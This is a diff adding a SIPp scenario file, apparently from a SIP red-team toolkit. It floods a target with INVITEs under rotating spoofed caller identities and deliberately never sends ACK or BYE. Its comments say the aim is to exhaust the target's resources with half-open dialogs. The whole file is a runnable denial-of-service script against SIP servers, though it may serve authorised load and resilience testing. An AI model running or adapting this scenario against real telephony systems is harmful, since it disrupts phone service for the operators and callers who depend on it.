@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!DOCTYPE scenario SYSTEM "sipp.dtd">
+
+<!-- invite_no_ack.xml
+     Same INVITE as invite_flood.xml (single real source, rotating
+     spoofed identity and destination extension) but deliberately
+     stops the moment the mandatory 200 recv completes - no ACK, no
+     BYE, ever. This is the point of the scenario: a target that
+     answers keeps that dialog (and, realistically, its own 200
+     retransmission timer) open waiting for an ACK that never comes,
+     which is a different and specifically damaging resource cost
+     from invite_flood's clean call-setup-and-teardown cycle. See
+     ROADMAP.md's invite_no_ack entry for the full rationale - don't
+     add a send block after the 200 recv below, that would silently
+     turn this back into invite_flood and defeat the entire point of
+     having both scenarios. -->
+
+<!-- IMPORTANT: [call_id] must be used verbatim as the entire Call-ID
+     header value, unprefixed and unsuffixed. SIPp correlates responses
+     back to the open transaction using this value internally, not by
+     doing a literal string-compare against what it sent - a custom
+     prefix breaks that correlation and every response gets silently
+     discarded as "out of call", even a perfectly well-formed one.
+     Rotate identity via the From/To/Contact user-part instead. -->
+
+<scenario name="INVITE No-ACK - single source, half-open dialog exhaustion">
+
+  <send retrans="500">
+    <![CDATA[
+
+      INVITE sip:[call_number]@[remote_ip]:[remote_port] SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      From: <sip:floodtest[call_number]@[local_ip]>;tag=[call_number]
+      To: <sip:[call_number]@[remote_ip]:[remote_port]>
+      Call-ID: [call_id]
+      CSeq: 1 INVITE
+      Contact: <sip:floodtest[call_number]@[local_ip]:[local_port]>
+      Max-Forwards: 70
+      User-Agent: SIP-Redteam-Toolkit-InviteNoAck
+      Content-Type: application/sdp
+      Content-Length: [len]
+
+      v=0
+      o=floodtest[call_number] 0 0 IN IP[local_ip_type] [local_ip]
+      s=-
+      c=IN IP[media_ip_type] [media_ip]
+      t=0 0
+      m=audio [media_port] RTP/AVP 0
+      a=rtpmap:0 PCMU/8000
+
+    ]]>
+  </send>
+
+  <!-- Same "exactly one mandatory recv" rule as every other scenario
+       here (see baseline_probe.xml) - 100/180 optional, 200 the one
+       mandatory close. A non-200 final response or a silent drop both
+       surface as the same "not successful" signal in stats, which is
+       all the before/after comparisons need. Unlike invite_flood.xml,
+       nothing comes after this recv - that omission IS the scenario. -->
+  <recv response="100" optional="true"></recv>
+  <recv response="180" optional="true"></recv>
+  <recv response="200"></recv>
+
+</scenario>
